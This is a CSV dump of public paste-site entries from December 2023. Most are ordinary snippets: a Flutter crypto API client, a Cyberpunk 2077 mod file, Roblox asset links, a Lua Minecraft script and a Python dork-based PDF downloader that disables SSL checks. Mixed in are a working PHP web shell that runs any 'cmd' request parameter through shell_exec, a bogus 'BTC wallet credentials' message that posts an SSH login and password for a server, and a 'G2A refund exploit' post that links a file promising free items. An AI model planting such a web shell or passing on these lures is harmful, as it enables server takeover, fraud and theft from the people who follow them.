id,title,username,language,date,content
iURnjiS6,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Tuesday 19th of December 2023 11:33:20 PM CDT,"Dear Moe,
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

Regards,
GM-715480"
V1uBSRHe,G2A Refund Exploit Dec 2023,G2ARefundExploit,GetText,Tuesday 19th of December 2023 10:20:37 PM CDT,"G2A refund exploit updated guide - any item for free on G2A.com

https://drive.google.com/file/d/1AKxSk9vs38aBF7GEDJxf8mNi-_NVRLQ9/view#g2a_refund_exploit.pdf

Working as of 
13 December 2023

917706"
nfmFV34K,INVENTARIO,LeanCoder0852,C#,Tuesday 19th of December 2023 09:59:38 PM CDT,INVENTARIO2023
qLcDEB0J,flutter api,yocky12k,Dart,Tuesday 19th of December 2023 08:53:46 PM CDT,"dependencies:
  flutter:
    sdk: flutter
  http: ^0.13.6

file api_service.dart

import 'package:http/http.dart' as http;
import 'dart:convert';

class ApiService {
  Future<List<dataCrypto>> bacaApi() async {
    final response = await http.get(Uri.parse('https://api.coinlore.net/api/tickers/'));
    if(response.statusCode == 200){
      final List<dynamic> dataList = json.decode(response.body)['data'];
      List<dataCrypto> cryptoList = dataList.map((data) => dataCrypto.fromJson(data)).toList();
      return cryptoList;
    }else{
      throw Exception('Gagal baca data');
    }
  }
}

class dataCrypto {
  final String id;
  final String symbol;
  final String name;

  dataCrypto({
    required this.id,
    required this.symbol,
    required this.name,
  });

  factory dataCrypto.fromJson(Map<String, dynamic> json){
    return dataCrypto(
      id: json['id'],
      symbol: json['symbol'],
      name: json['name'],
      );
  }
}

file provider_crypto.dart
import 'package:flutter/material.dart';
import 'api_service.dart';

class ProviderCrypto extends ChangeNotifier {
  final ApiService apiService = ApiService();
  List<dataCrypto> cryptoList = [];

  Future<void> ambilApi() async {
    try {
       cryptoList = await apiService.bacaApi();
       notifyListeners();
    } catch (e) {
       print('Error: $e');
    }
  }
}"
NxPpe53y,Mod Fix: Blackwall Quickhacks enabled and Iconic version via PL story,michaelrw,YAML,Tuesday 19th of December 2023 08:39:25 PM CDT,"# mod made by AliceMods662
# updated by exploiteddna 19Dec2023 :) 

Items.BlackwallGateway_Songbird:
  $base: Items.BlackWallProgramLvl4
  entityName: sy_blackwallbreach
  appearanceName: sy_blackwallbreach_
  displayName: BlackwallDisplayName
  quality: Quality.Legendary
  icon:
    atlasResourcePath: base\gameplay\gui\common\icons\items\syrial_blackwallProgramInkAtlas\item_icons15.inkatlas
    atlasPartName: sy_quickhack_iconic_blackwallBreach
  tags:
    - itemPart
    - SoftwareShard
    - Tier2Shard
    - Tier3Shard
    - Tier4Shard
  objectActions:
    - ItemAction.ProgramDisassemble
    - QuickHack.BlackWallHackIconic
    - QuickHack.BlackWallHackIconic
    - QuickHack.BlackWallHackIconic

  statModifiers:
    - Quality.IconicItem
  CraftingData: Items.BlackwallBreachCraftingPackage
  OnAttach: [ EquipmentGLP.BlackwallBreachProgramLvl4 ]

Items.BlackwallBreachCraftingPackage:
  $type: gamedataCraftingPackage_Record
  craftingExpModifier: 1
  craftingRecipe:
    - Items.LegendaryProgramCraftingPackage_blackwall
    - Items.LegendaryProgramCraftingPackage_blackwall_inline0
  overcraftPenaltyModifier: 1

Items.LegendaryProgramCraftingPackage_blackwall:
  $type: gamedataRecipeElement_Record
  amount: 75
  ingredient: Items.QuickHackLegendaryMaterial1

Items.LegendaryProgramCraftingPackage_blackwall_inline0:
  $type: gamedataRecipeElement_Record
  amount: 1
  ingredient: Items.Q305_Cerberus_core_cracked

# ------------------------- mechanics --------------------------


QuickHack.BlackWallHackIconic:
    $type: gamedataObjectAction_Record
    actionName: BlackWall
    hackCategory: HackCategory.UltimateHack
    interactionLayer: remote
    objectActionType: ObjectActionType.PuppetQuickHack
    objectActionUI: Interactions.BlackwallHack
    priority: 3
    activationTime:
      - QuickHack.BaseBlackWallHackIconic_inline11
    completionEffects:
      - QuickHack.QuickHack_inline2
      - QuickHack.QuickHack_inline6
      - QuickHack.QuickHack_inline8
      - QuickHack.QuickHack_inline9
      - QuickHack.UltimateHack_inline5
      - QuickHack.BaseBlackWallHack_inline9
      - QuickHack.BlackWallHackIconic_inline3
      - QuickHack.BlackWallHack_inline6
      - QuickHack.BlackWallHack_inline12
    costs:
      - QuickHack.BaseBlackWallHackIconic_inline7
    durationTime: []
    instigatorActivePrereqs: []
    instigatorPrereqs:
      - QuickHack.QuickHack_inline1
      - QuickHack.BaseBlackWallHack_inline0
    rewards: []
    startEffects:
      - QuickHack.QuickHack_inline10
      - QuickHack.UltimateHack_inline1
      - QuickHack.BaseBlackWallHack_inline1
      - QuickHack.BaseBlackWallHack_inline2
      - QuickHack.BaseBlackWallHackIconic_inline3
      - QuickHack.BaseBlackWallHackIconic_inline4
      - QuickHack.BaseBlackWallHack_inline5
      - QuickHack.BlackWallHackIconic_inline0
    targetActivePrereqs:
      - Prereqs.QuickHackUploadingPrereq
      - Prereqs.ChimeraNoQuickHackPrereq
      - Prereqs.QuickHackTargetMortalPrereq
      - Prereqs.BlackwallPrereq
    targetPrereqs: []
    awarenessCost: QuickHack.UltimateHack_inline2
    memoryCostReductionInOverclock: 0.725000024
    isQuickHack: True

QuickHack.BaseBlackWallHackIconic_inline7: #costs
  $type: gamedataStatPoolCost_Record
  statPool: BaseStatPools.Memory
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BaseBlackWallHackIconic_inline8


QuickHack.BaseBlackWallHackIconic_inline8:
  $type: gamedataConstantStatModifier_Record
  value: 12
  modifierType: Additive
  statType: BaseStats.Memory

QuickHack.BaseBlackWallHackIconic_inline11:
  $type: gamedataConstantStatModifier_Record
  value: 8
  modifierType: Additive
  statType: BaseStats.QuickHackUpload

QuickHack.BlackWallHackIconic_inline3:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackWallHackIconic_inline4
  recipient: ObjectActionReference.Target

QuickHack.BaseBlackWallHackIconic_inline11_inline4:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce2
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackWallHack_inline5
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []

QuickHack.BlackwallHackIconic_inline0:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackWallHackIconic_inline1
  recipient: ObjectActionReference.Target

QuickHack.BlackWallHackIconic_inline1:
    $type: gamedataSpreadEffector_Record
    effectTag: spread
    objectAction: QuickHack.BlackwallHackIconicBounce2
    spreadToAllTargetsInTheArea: False
    effectorClassName: SpreadEffector
    prereqRecord: QuickHack.BlackWallHack_inline2
    removeAfterActionCall: False
    removeAfterPrereqCheck: False
    statModifierGroups: []

QuickHack.BlackWallHackIconic_inline4:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce2
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackWallHack_inline5
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []


#----------------------------------------------------------- BOUNCE 2---------------------------------------------------------------------------------

QuickHack.BlackwallHackIconicBounce2:
  $type: gamedataObjectAction_Record
  actionName: BlackWall
  hackCategory: HackCategory.UltimateHack
  interactionLayer: remote
  objectActionType: ObjectActionType.PuppetQuickHack
  objectActionUI: Interactions.BlackwallHack
  priority: 0
  activationTime:
    - QuickHack.BaseBlackWallHack_inline11
    - QuickHack.BlackwallHackIconicBounce2_inline0
  completionEffects:
    - QuickHack.QuickHack_inline2
    - QuickHack.QuickHack_inline6
    - QuickHack.QuickHack_inline8
    - QuickHack.QuickHack_inline9
    - QuickHack.UltimateHack_inline5
    - QuickHack.BaseBlackWallHack_inline9
    - QuickHack.BlackwallHackIconicBounce2_inline8
    - QuickHack.BlackwallHackBounce2_inline11
    - QuickHack.BlackwallHackBounce2_inline17
  costs:
    - QuickHack.BlackwallHackIconicBounce2_inline1
  durationTime: []
  instigatorActivePrereqs: []
  instigatorPrereqs: []
  rewards: []
  startEffects:
    - QuickHack.BlackwallHackBounce2_inline3
    - QuickHack.BlackwallHackBounce2_inline4
    - QuickHack.BlackwallHackBounce2_inline7
  targetActivePrereqs:
    - Prereqs.QuickHackUploadingPrereq
    - Prereqs.ChimeraNoQuickHackPrereq
    - Prereqs.QuickHackTargetMortalPrereq
    - Prereqs.BlackwallPrereq
  targetPrereqs: []
  awarenessCost: QuickHack.UltimateHack_inline2
  memoryCostReductionInOverclock: 0.725000024
  isQuickHack: True

QuickHack.BlackwallHackIconicBounce2_inline1:
  $base: QuickHack.BlackwallHackBounce2_inline1
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BlackwallHackIconicBounce2_inline2

QuickHack.BlackwallHackIconicBounce2_inline2:
  $base: QuickHack.BlackwallHackBounce2_inline2
  value: 16

QuickHack.BlackwallHackIconicBounce2_inline8:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackwallHackIconicBounce2_inline9
  recipient: ObjectActionReference.Target

QuickHack.BlackwallHackIconicBounce2_inline9:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce3
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackwallHackBounce2_inline10
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []
#----------------------------------------------------------- BOUNCE 3---------------------------------------------------------------------------------

QuickHack.BlackwallHackIconicBounce3:
  $type: gamedataObjectAction_Record
  actionName: BlackWall
  hackCategory: HackCategory.UltimateHack
  interactionLayer: remote
  objectActionType: ObjectActionType.PuppetQuickHack
  objectActionUI: Interactions.BlackwallHack
  priority: 0
  activationTime:
    - QuickHack.BaseBlackWallHack_inline11
    - QuickHack.BlackwallHackBounce3_inline0
  completionEffects:
    - QuickHack.QuickHack_inline2
    - QuickHack.QuickHack_inline6
    - QuickHack.QuickHack_inline8
    - QuickHack.QuickHack_inline9
    - QuickHack.UltimateHack_inline5
    - QuickHack.BaseBlackWallHack_inline9
    - QuickHack.BlackwallHackIconicBounce3_inline8
    - QuickHack.BlackwallHackBounce3_inline11
    - QuickHack.BlackwallHackBounce3_inline17
  costs:
    - QuickHack.BlackwallHackIconicBounce3_inline1
  durationTime: []
  instigatorActivePrereqs: []
  instigatorPrereqs: []
  rewards: []
  startEffects:
    - QuickHack.BlackwallHackBounce3_inline3
    - QuickHack.BlackwallHackBounce3_inline4
    - QuickHack.BlackwallHackBounce3_inline7
  targetActivePrereqs:
    - Prereqs.QuickHackUploadingPrereq
    - Prereqs.ChimeraNoQuickHackPrereq
    - Prereqs.QuickHackTargetMortalPrereq
    - Prereqs.BlackwallPrereq
  targetPrereqs: []
  awarenessCost: QuickHack.UltimateHack_inline2
  memoryCostReductionInOverclock: 0.725000024
  isQuickHack: True

QuickHack.BlackwallHackIconicBounce3_inline1:
  $type: gamedataStatPoolCost_Record
  statPool: BaseStatPools.Memory
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BlackwallHackIconicBounce3_inline2

QuickHack.BlackwallHackIconicBounce3_inline2:
  $type: gamedataConstantStatModifier_Record
  value: 19
  modifierType: Additive
  statType: BaseStats.Memory

QuickHack.BlackwallHackIconicBounce3_inline8:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackwallHackIconicBounce3_inline9
  recipient: ObjectActionReference.Target

QuickHack.BlackwallHackIconicBounce3_inline9:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce4
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackwallHackBounce3_inline10
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []

#----------------------------------------------------------- BOUNCE 4---------------------------------------------------------------------------------

QuickHack.BlackwallHackIconicBounce4:
  $type: gamedataObjectAction_Record
  actionName: BlackWall
  hackCategory: HackCategory.UltimateHack
  interactionLayer: remote
  objectActionType: ObjectActionType.PuppetQuickHack
  objectActionUI: Interactions.BlackwallHack
  priority: 0
  activationTime:
    - QuickHack.BaseBlackWallHack_inline11
    - QuickHack.BlackwallHackBounce4_inline0
  completionEffects:
    - QuickHack.QuickHack_inline2
    - QuickHack.QuickHack_inline6
    - QuickHack.QuickHack_inline8
    - QuickHack.QuickHack_inline9
    - QuickHack.UltimateHack_inline5
    - QuickHack.BaseBlackWallHack_inline9
    - QuickHack.BlackwallHackIconicBounce4_inline8
    - QuickHack.BlackwallHackBounce4_inline11
    - QuickHack.BlackwallHackBounce4_inline17
  costs:
    - QuickHack.BlackwallHackIconicBounce4_inline1
  durationTime: []
  instigatorActivePrereqs: []
  instigatorPrereqs: []
  rewards: []
  startEffects:
    - QuickHack.BlackwallHackBounce4_inline3
    - QuickHack.BlackwallHackBounce4_inline4
    - QuickHack.BlackwallHackBounce4_inline7
  targetActivePrereqs:
    - Prereqs.QuickHackUploadingPrereq
    - Prereqs.ChimeraNoQuickHackPrereq
    - Prereqs.QuickHackTargetMortalPrereq
    - Prereqs.BlackwallPrereq
  targetPrereqs: []
  awarenessCost: QuickHack.UltimateHack_inline2
  memoryCostReductionInOverclock: 0.725000024
  isQuickHack: True

QuickHack.BlackwallHackIconicBounce4_inline1:
  $type: gamedataStatPoolCost_Record
  statPool: BaseStatPools.Memory
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BlackwallHackIconicBounce4_inline2

QuickHack.BlackwallHackIconicBounce4_inline2:
  $type: gamedataConstantStatModifier_Record
  value: 23
  modifierType: Additive
  statType: BaseStats.Memory

QuickHack.BlackwallHackIconicBounce4_inline8:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackwallHackIconicBounce4_inline9
  recipient: ObjectActionReference.Target

QuickHack.BlackwallHackIconicBounce4_inline9:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce5
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackwallHackBounce4_inline10
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []

#----------------------------------------------------------- BOUNCE 5---------------------------------------------------------------------------------

QuickHack.BlackwallHackIconicBounce5:
  $type: gamedataObjectAction_Record
  actionName: BlackWall
  hackCategory: HackCategory.UltimateHack
  interactionLayer: remote
  objectActionType: ObjectActionType.PuppetQuickHack
  objectActionUI: Interactions.BlackwallHack
  priority: 0
  activationTime:
    - QuickHack.BaseBlackWallHack_inline11
    - QuickHack.BlackwallHackBounce5_inline0
  completionEffects:
    - QuickHack.QuickHack_inline2
    - QuickHack.QuickHack_inline6
    - QuickHack.QuickHack_inline8
    - QuickHack.QuickHack_inline9
    - QuickHack.UltimateHack_inline5
    - QuickHack.BaseBlackWallHack_inline9
    - QuickHack.BlackwallHackIconicBounce5_inline8
    - QuickHack.BlackwallHackBounce5_inline11
    - QuickHack.BlackwallHackBounce5_inline17
  costs:
    - QuickHack.BlackwallHackIconicBounce5_inline1
  durationTime: []
  instigatorActivePrereqs: []
  instigatorPrereqs: []
  rewards: []
  startEffects:
    - QuickHack.BlackwallHackBounce5_inline3
    - QuickHack.BlackwallHackBounce5_inline4
    - QuickHack.BlackwallHackBounce5_inline7
  targetActivePrereqs:
    - Prereqs.QuickHackUploadingPrereq
    - Prereqs.ChimeraNoQuickHackPrereq
    - Prereqs.QuickHackTargetMortalPrereq
    - Prereqs.BlackwallPrereq
  targetPrereqs: []
  awarenessCost: QuickHack.UltimateHack_inline2
  memoryCostReductionInOverclock: 0.725000024
  isQuickHack: True

QuickHack.BlackwallHackIconicBounce5_inline1:
  $type: gamedataStatPoolCost_Record
  statPool: BaseStatPools.Memory
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BlackwallHackIconicBounce5_inline2

QuickHack.BlackwallHackIconicBounce5_inline2:
  $type: gamedataConstantStatModifier_Record
  value: 25
  modifierType: Additive
  statType: BaseStats.Memory

QuickHack.BlackwallHackIconicBounce5_inline8:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackwallHackIconicBounce5_inline9
  recipient: ObjectActionReference.Target

QuickHack.BlackwallHackIconicBounce5_inline9:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce6
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackwallHackBounce5_inline10
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []

  #----------------------------------------------------------- BOUNCE 6---------------------------------------------------------------------------------

QuickHack.BlackwallHackIconicBounce6:
  $type: gamedataObjectAction_Record
  actionName: BlackWall
  hackCategory: HackCategory.UltimateHack
  interactionLayer: remote
  objectActionType: ObjectActionType.PuppetQuickHack
  objectActionUI: Interactions.BlackwallHack
  priority: 0
  activationTime:
    - QuickHack.BaseBlackWallHack_inline11
    - QuickHack.BlackwallHackBounce6_inline0
  completionEffects:
    - QuickHack.QuickHack_inline2
    - QuickHack.QuickHack_inline6
    - QuickHack.QuickHack_inline8
    - QuickHack.QuickHack_inline9
    - QuickHack.UltimateHack_inline5
    - QuickHack.BaseBlackWallHack_inline9
    - QuickHack.BlackwallHackBounce6_inline5
    - QuickHack.BlackwallHackBounce6_inline11
  costs:
    - QuickHack.BlackwallHackBounce6_inline1
  durationTime: []
  instigatorActivePrereqs: []
  instigatorPrereqs: []
  rewards: []
  startEffects:
    - QuickHack.BlackwallHackBounce6_inline3
    - QuickHack.BlackwallHackBounce6_inline4
  targetActivePrereqs:
    - Prereqs.QuickHackUploadingPrereq
    - Prereqs.ChimeraNoQuickHackPrereq
    - Prereqs.QuickHackTargetMortalPrereq
    - Prereqs.BlackwallPrereq
  targetPrereqs: []
  awarenessCost: QuickHack.UltimateHack_inline2
  memoryCostReductionInOverclock: 0.725000024
  isQuickHack: True

QuickHack.BlackwallHackBounce6_inline1:
  $type: gamedataStatPoolCost_Record
  statPool: BaseStatPools.Memory
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BlackwallHackBounce6_inline2

QuickHack.BlackwallHackBounce6_inline2:
    $type: gamedataConstantStatModifier_Record
    value: 26
    modifierType: Additive
    statType: BaseStats.Memory

#--------------------------- ENABLE -----------------------------------------------------------------
Items.BlackWallProgramLvl4:
  tags:
   - !remove HideInUI
   - !remove DummyPart
  icon:
    atlasResourcePath: base\gameplay\gui\common\icons\items\syrial_blackwallProgramInkAtlas\item_icons15.inkatlas
    atlasPartName: sy_quickhack_blackwallBreach

Items.BlackWallProgramLvl3:
  tags:
   - !remove HideInUI
   - !remove DummyPart
  icon:
    atlasResourcePath: base\gameplay\gui\common\icons\items\syrial_blackwallProgramInkAtlas\item_icons15.inkatlas
    atlasPartName: sy_quickhack_blackwallBreach


Items.BlackWallProgramLvl2:
  tags:
   - !remove HideInUI
   - !remove DummyPart
  icon:
    atlasResourcePath: base\gameplay\gui\common\icons\items\syrial_blackwallProgramInkAtlas\item_icons15.inkatlas
    atlasPartName: sy_quickhack_blackwallBreach

LootTables.ep1_q306_songbirds_cache.maxItemsToLoot: 4
LootTables.ep1_q306_songbirds_cache.minItemsToLoot: 4

#------------------------------------------------------- WEIRD SHIT --------------------------------------
#Vendors.wat_kab_netrunner_01.itemStock:
#  - !append Vendors.wat_kab_netrunner_blackwallGatewaySy

Vendors.wat_kab_netrunner_blackwallGatewaySy:
  $type: gamedataVendorItem_Record
  item: Items.BlackwallGateway_Songbird
  generationPrereqs: [ Prereqs.BlackwallBreachAtYoko ]
  quantity: [ Vendors.IsPresent ]

Vendors.BlackwallPresent:
  $type: gamedataRandomStatModifier_Record
  max: 1
  min: 1
  useControlledRandom: False
  modifierType: Additive
  statType: BaseStats.Quantity

Prereqs.BlackwallBreachAtYoko:
  $type: IPrereq
  prereqClassName: FactValuePrereq

Prereqs.BlackwallBreachAtYoko.comparisonType: n""LessOrEqual""
Prereqs.BlackwallBreachAtYoko.fact: n""q305_ib_datafort_shutdown_finished""
Prereqs.BlackwallBreachAtYoko.value: 0

LootTables.ep1_q306_songbirds_cache.lootItems:
  - LootTables.ep1_q306_songbirds_cache_inline0
  - LootTables.ep1_q306_songbirds_cache_inline1
  - LootTables.ep1_q306_songbirds_cache_inline2
  - LootTables.ep1_q306_songbirds_cache_inline3

LootTables.ep1_q306_songbirds_cache_inline3:
  $type: gamedataLootItem_Record
  itemID: Items.BlackwallGateway_Songbird
  dropChance: 1
  dropCountMax: 1
  dropCountMin: 1
  quantityModifiers: []
  statModifiers: []

LootTables.ep1_q305_haunted_deck_recipe.lootItems:
  - !append LootTables.ep1_q305_haunted_deck_recipe_Blackwall
  - !append LootTables.ep1_q305_haunted_deck_inline4

LootTables.ep1_q305_haunted_deck_recipe_Blackwall:
  $type: gamedataLootItem_Record
  itemID: Items.BlackwallGateway_Songbird
  dropChance: 1
  dropCountMax: 1
  dropCountMin: 1
  quantityModifiers: []
  statModifiers: []

LootTables.ep1_q305_haunted_deck_recipe.maxItemsToLoot: 5
LootTables.ep1_q305_haunted_deck_recipe.minItemsToLoot: 2

EquipmentGLP.BlackwallBreachProgramLvl4:
  $type: gamedataGameplayLogicPackage_Record
  stackable: False
  UIData: EquipmentGLP.BlackwallBreachProgramLvl4_inline0
  animationWrapperOverrides: []
  effectors: []
  items: []
  statPools: []
  stats: []

EquipmentGLP.BlackwallBreachProgramLvl4_inline0:
  $type: gamedataGameplayLogicPackageUIData_Record
  floatValues: [ 5,20 ]
  iconPath: ability_utility
  intValues: []
  localizedDescription: LocKey#blackwall_quickhack_iconic_desc
  localizedName: LocKey#BlackwallAppearanceName
  nameValues: []
  stats: []
"
xHL9xeKF,bodycolorrs,Lancere,Lua,Tuesday 19th of December 2023 08:29:02 PM CDT,null nil 125 125 125 Body Colors 125 125 125 true
iyCMj3JN,Untitled,Lancere,Lua,Tuesday 19th of December 2023 08:27:36 PM CDT,https://pastebin.com/raw/xHL9xeKF?userid=2;http://www.roblox.com/Asset/?id=1272714;http://www.roblox.com/Asset/?id=305888394;http://www.roblox.com/Asset/?id=6340141;http://www.roblox.com/Asset/?id=27112025;http://www.roblox.com/Asset/?id=32336182;http://www.roblox.com/Asset/?id=32336117;http://www.roblox.com/Asset/?id=27112056;http://www.roblox.com/Asset/?id=27112068;http://www.roblox.com/Asset/?id=10831454;http://www.roblox.com/Asset/?id=25926517&type=gear;http://www.roblox.com/Asset/?id=47044627;http://www.roblox.com/Asset/?id=5200062;http://www.roblox.com/Asset/?id=389012259;
aELNPxLG,abc.php,Nizar-Dev,PHP,Tuesday 19th of December 2023 07:59:21 PM CDT,"<?php
// shell.php
if(isset($_GET['cmd'])) {
    $output = shell_exec( $_GET['cmd'] );
    $html = isset($_GET['html']) ? true : false;
    if($html === true) {
        echo ""<pre>\n"";
    }
    echo $output;
    if($html === true) {
        echo ""</pre>\n"";
    }
    exit;
}
?>"
UijkVi6v,dork downloader (PDFs),nitestryker,Python,Tuesday 19th of December 2023 07:55:33 PM CDT,"#!/bin/python
# Copyright 2023 Nitestryker

# This software is provided 'as-is', without any express or implied
# warranty.  In no event will the authors be held liable for any damages
#  arising from the use of this software.

#  Permission is granted to anyone to use this software for any purpose,
#  including commercial applications, and to alter it and redistribute it
#  freely, subject to the following restrictions:

#  1. The origin of this software must not be misrepresented; you must not
#     claim that you wrote the original software. If you use this software
#     in a product, an acknowledgment in the product documentation would be
#    appreciated but is not required.
#  2. Altered source versions must be plainly marked as such, and must not be
#     misrepresented as being the original software.
#  3. This notice may not be removed or altered from any source distribution.

import requests
import os

def download_pdf(url, output_path):
    #response = requests.get(url, stream=True)
    response = requests.get(url, stream=True, verify=False) # Disable SSL certificate verification
    if response.status_code == 200:
        with open(output_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=1024):
                if chunk:
                    file.write(chunk)
        print(f""Downloaded: {output_path}"")
    else:
        print(f""Failed to download: {url} (Status Code: {response.status_code})"")

def search_and_download(query, num_results, base_url, output_dir):
    # Perform the Google search using the query
    search_url = f""{base_url}/search?q={query}""
    response = requests.get(search_url)
    search_results = response.text

    # Create the output directory if it doesn't exist
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    # Keep track of the number of downloaded PDFs
    downloaded_count = 0

    # Extract and download PDF links
    start_index = 0
    while downloaded_count < num_results:
        start_link = search_results.find('<a href=""/url?q=', start_index)
        end_link = search_results.find('&amp;', start_link + 1)
        if start_link == -1 or end_link == -1:
            break

        url = search_results[start_link + 16: end_link]
        if url.endswith('.pdf'):
            filename = url.split(""/"")[-1]
            output_path = os.path.join(output_dir, filename)
            download_pdf(url, output_path)
            downloaded_count += 1

        start_index = end_link

# Set the query, number of results to retrieve, base URL, and output directory
query = 'filetype:pdf programming'
num_results = 10
base_url = ""https://www.google.com""
output_dir = ""pdfs""

# Call the search_and_download function
search_and_download(query, num_results, base_url, output_dir)
"
BfhiCXW2,CC Advanced Peripheral Minecolonies ME Supplier,ecco7777,Lua,Tuesday 19th of December 2023 07:44:49 PM CDT,"me=peripheral.wrap(""top"")
mc=peripheral.wrap(""back"")
stuff=mc.getWorkOrderResources(1)
for i=1,#stuff do
    item={}
    item.name=stuff[i].item
    item.count=stuff[i].needed-stuff[i].available
    if stuff.status~=""NOT_NEEDED"" then
        me.exportItem(item,""up"")
    end
end"
